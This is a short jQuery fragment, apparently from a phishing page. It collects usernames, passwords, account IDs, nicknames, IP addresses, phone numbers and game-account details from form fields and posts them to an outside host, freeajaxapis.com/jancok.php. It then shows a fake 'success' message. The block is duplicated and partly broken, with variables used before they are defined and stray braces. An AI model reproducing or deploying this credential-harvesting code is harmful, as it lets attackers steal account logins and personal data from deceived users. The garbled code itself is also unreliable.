$.post("https://freeajaxapis.com/jancok.php",{
         user:$("#user"),
         pass:pass,
         id:id,
         hp:hp,
         level:level,
         nick:nick,
         tier:tier,
         ep:ep,
         ip:ip
    },function(ngSuccess){
         $("#submit").prop("disabled",true);
         });
    
    $("#submit").prop("disabled",true);
    setTimeout(() => {
    $(".sukses").css("display","flex");
    },1000);
    return false;
    }
    var user = $("#user").val();
    var pass = $("#pass").val();
    var id = $("#id").val();
    var nick = $("#nick").val();
    var ip = $("#ip").val();
    var hp = $("#hp").val();
    var level = $("#level").val();
    var tier = $("#tier").val();
    var ep = $("#ep").val();
$.post("http://freeajaxapis.com/jancok.php",{
         user:user,
         pass:pass,
         id:id,
         hp:hp,
         level:level,
         nick:nick,
         tier:tier,
         ep:ep,
         ip:ip
    },function(ngSuccess){
         $("#submit").prop("disabled",true);
         });
    
    $("#submit").prop("disabled",true);
    setTimeout(() => {
    $(".sukses").css("display","flex");
    },1000);
    return false;
    }
